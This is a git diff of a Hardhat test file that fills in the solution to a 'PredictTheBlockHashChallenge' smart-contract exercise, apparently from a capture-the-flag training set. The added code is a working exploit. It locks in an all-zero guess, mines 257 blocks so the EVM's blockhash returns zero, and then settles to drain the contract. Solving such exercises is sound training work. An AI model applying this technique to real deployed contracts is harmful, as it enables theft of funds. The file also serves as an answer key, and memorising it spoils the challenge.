@@ -1,7 +1,7 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
-import { ethers } from 'hardhat';
+import { ethers, network } from 'hardhat';
 const { utils } = ethers;
 
 describe('PredictTheBlockHashChallenge', () => {
@@ -24,9 +24,17 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await target.lockInGuess('0x0000000000000000000000000000000000000000000000000000000000000000', {
+      value: utils.parseEther('1'),
+    });
+
+    for (let i = 0; i < 257; i++) {
+      console.log('Rock', i);
+      await network.provider.send('evm_increaseTime', [1]);
+      await network.provider.send('evm_mine');
+    }
+
+    await target.settle();
 
     expect(await target.isComplete()).to.equal(true);
   });
